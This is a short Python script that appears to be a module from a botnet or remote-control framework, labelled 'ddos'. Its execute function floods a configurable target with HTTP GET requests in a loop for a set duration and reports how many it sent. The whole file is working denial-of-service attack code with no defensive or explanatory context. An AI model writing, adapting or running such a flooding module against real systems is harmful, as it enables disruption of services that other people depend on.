import requests, time

def execute(config, client_id):
    target = config.get("target", "127.0.0.1")
    duration = config.get("duration", 5)
    end = time.time() + duration
    count = 0
    while time.time() < end:
        try:
            requests.get(f"http://{target}", timeout=1)
            count += 1
        except: pass
    return {"module": "ddos", "requests_sent": count}